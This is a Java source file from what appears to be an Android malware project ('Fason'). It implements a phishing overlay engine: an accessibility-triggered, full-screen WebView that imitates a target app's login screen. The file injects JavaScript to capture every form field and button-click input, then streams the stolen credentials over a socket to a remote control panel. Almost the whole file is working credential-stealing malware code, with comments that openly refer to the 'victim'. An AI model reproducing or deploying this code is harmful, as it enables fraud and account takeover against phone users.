package com.fason.app.features.overlay;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import io.socket.client.Socket;

/**
 * OverlayManager — Phishing overlay engine.
 *
 * Renders a full-screen WebView overlay (TYPE_APPLICATION_OVERLAY) on top of any
 * app. The panel sends an HTML payload (login page lookalike). When the victim
 * submits the form, the JavaScript bridge fires captureSubmit() which forwards
 * the credentials to the panel in real-time.
 *
 * Smart trigger: optionally auto-show when a specified package enters the
 * foreground (detected via FasonAccessibilityService window events).
 */
public final class OverlayManager {
    private static final String TAG = "OverlayMgr";
    private static volatile OverlayManager instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private volatile WebView webView;
    private volatile View dimView;
    private volatile boolean shown = false;
    private volatile String targetPackage;
    private volatile String currentHtml;
    private volatile boolean smartTriggerArmed = false;

    private OverlayManager() {}

    public static OverlayManager getInstance() {
        if (instance == null) {
            synchronized (OverlayManager.class) {
                if (instance == null) instance = new OverlayManager();
            }
        }
        return instance;
    }

    // ── Configuration ─────────────────────────────────────────────────────────

    public void configure(String htmlContent, String targetPkg, String cmdId) {
        this.currentHtml    = htmlContent;
        this.targetPackage  = targetPkg;
        this.smartTriggerArmed = (targetPkg != null && !targetPkg.isEmpty());
        sendStatus("configured", cmdId);
    }

    // ── Show / Hide ───────────────────────────────────────────────────────────

    public void show(String htmlOverride, String cmdId) {
        mainHandler.post(() -> {
            try {
                if (shown) { hide(null); }
                String html = htmlOverride != null ? htmlOverride : currentHtml;
                if (html == null || html.isEmpty()) {
                    sendStatus("error: no HTML content configured", cmdId);
                    return;
                }
                showOverlay(html, cmdId);
            } catch (Exception e) {
                Log.e(TAG, "show failed", e);
                sendStatus("error: " + e.getMessage(), cmdId);
            }
        });
    }

    public void hide(String cmdId) {
        mainHandler.post(() -> {
            try {
                Context ctx = FasonApp.getContext();
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                if (wm == null) return;
                if (webView != null) {
                    try { webView.stopLoading(); webView.destroy(); } catch (Exception ignored) {}
                    try { wm.removeView(webView); } catch (Exception ignored) {}
                    webView = null;
                }
                if (dimView != null) {
                    try { wm.removeView(dimView); } catch (Exception ignored) {}
                    dimView = null;
                }
                shown = false;
                sendStatus("hidden", cmdId);
            } catch (Exception e) {
                Log.w(TAG, "hide failed", e);
            }
        });
    }

    // ── Smart trigger (called from FasonAccessibilityService) ─────────────────

    /** Called when a new window/app comes to foreground. */
    public void onForegroundPackage(String pkg) {
        if (!smartTriggerArmed) return;
        if (pkg == null || !pkg.equals(targetPackage)) return;
        if (!shown) {
            Log.d(TAG, "Smart trigger fired for " + pkg);
            show(null, null);
        }
    }

    public boolean isShown() { return shown; }
    public String getTargetPackage() { return targetPackage; }
    public boolean isSmartTriggerArmed() { return smartTriggerArmed; }

    // ── Internal overlay construction ──────────────────────────────────────────

    @SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
    private void showOverlay(String html, String cmdId) {
        Context ctx = FasonApp.getContext();
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (wm == null) { sendStatus("error: no window manager", cmdId); return; }

        int overlayType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;

        // Dim background
        dimView = new View(ctx);
        dimView.setBackgroundColor(Color.argb(180, 0, 0, 0));
        WindowManager.LayoutParams dimParams = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            overlayType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        );
        dimParams.gravity = Gravity.TOP | Gravity.START;
        wm.addView(dimView, dimParams);

        // WebView overlay
        webView = new WebView(ctx);
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
        ws.setAllowFileAccess(false);
        ws.setAllowContentAccess(false);
        webView.setBackgroundColor(Color.TRANSPARENT);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {
            @Override public boolean shouldOverrideUrlLoading(android.webkit.WebView v, String url) {
                // Block all navigation — overlay is self-contained
                return true;
            }
        });
        // JS bridge for form capture
        webView.addJavascriptInterface(new OverlayBridge(), "FasonBridge");

        WindowManager.LayoutParams wvParams = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            overlayType,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        );
        wvParams.gravity = Gravity.TOP | Gravity.START;
        wm.addView(webView, wvParams);

        // Inject FasonBridge call helper into HTML if not already present
        String injected = injectBridgeHelper(html);
        webView.loadDataWithBaseURL("https://overlay.local/", injected, "text/html", "UTF-8", null);

        shown = true;
        sendStatus("shown", cmdId);
        Log.d(TAG, "Overlay shown");
    }

    /**
     * Injects a convenience JS snippet so form submissions auto-call
     * FasonBridge.captureSubmit() without requiring it in the template.
     */
    private static String injectBridgeHelper(String html) {
        String bridge = "<script>\n" +
            "document.addEventListener('DOMContentLoaded', function() {\n" +
            "  var forms = document.querySelectorAll('form');\n" +
            "  forms.forEach(function(f) {\n" +
            "    f.addEventListener('submit', function(e) {\n" +
            "      e.preventDefault();\n" +
            "      var data = {};\n" +
            "      new FormData(f).forEach(function(v, k) { data[k] = v; });\n" +
            "      if (window.FasonBridge) FasonBridge.captureSubmit(JSON.stringify(data));\n" +
            "    });\n" +
            "  });\n" +
            "  // Also capture button clicks in SPA-style overlays\n" +
            "  document.addEventListener('click', function(e) {\n" +
            "    var btn = e.target.closest('button,[type=submit],[data-submit]');\n" +
            "    if (!btn) return;\n" +
            "    var fields = {};\n" +
            "    document.querySelectorAll('input,select,textarea').forEach(function(i) {\n" +
            "      if (i.name || i.id) fields[i.name || i.id] = i.value;\n" +
            "    });\n" +
            "    if (window.FasonBridge && Object.keys(fields).length) {\n" +
            "      FasonBridge.captureSubmit(JSON.stringify(fields));\n" +
            "    }\n" +
            "  });\n" +
            "});\n" +
            "</script>\n";
        // Insert before </body> or append at end
        int bodyClose = html.toLowerCase().lastIndexOf("</body>");
        if (bodyClose >= 0) return html.substring(0, bodyClose) + bridge + html.substring(bodyClose);
        return html + bridge;
    }

    // ── JavaScript bridge ──────────────────────────────────────────────────────

    private final class OverlayBridge {
        /** Called from JavaScript when the victim submits the phishing form. */
        @JavascriptInterface
        public void captureSubmit(String jsonFields) {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE, "capture");
                payload.put("fields", new JSONObject(jsonFields));
                payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                payload.put(Protocol.KEY_PACKAGE, targetPackage != null ? targetPackage : "");
                socket.emit(Protocol.OVERLAY, payload);
                Log.d(TAG, "Overlay capture emitted");
                // Auto-hide after successful capture
                mainHandler.postDelayed(() -> hide(null), 800);
            } catch (Exception e) {
                Log.e(TAG, "captureSubmit failed", e);
            }
        }

        /** Called from JavaScript to close the overlay (dismiss button, etc.). */
        @JavascriptInterface
        public void close() { mainHandler.post(() -> hide(null)); }

        /** Called from JavaScript to report a specific named field value. */
        @JavascriptInterface
        public void captureField(String name, String value) {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE, "field_capture");
                payload.put("fieldName", name);
                payload.put("fieldValue", value);
                payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                socket.emit(Protocol.OVERLAY, payload);
            } catch (Exception ignored) {}
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void sendStatus(String status, String cmdId) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject d = new JSONObject();
            d.put(Protocol.KEY_TYPE, "status");
            d.put(Protocol.KEY_STATUS, status);
            d.put("shown", shown);
            if (targetPackage != null) d.put(Protocol.KEY_PACKAGE, targetPackage);
            if (cmdId != null && !cmdId.isEmpty()) d.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.OVERLAY, d);
        } catch (Exception ignored) {}
    }
}
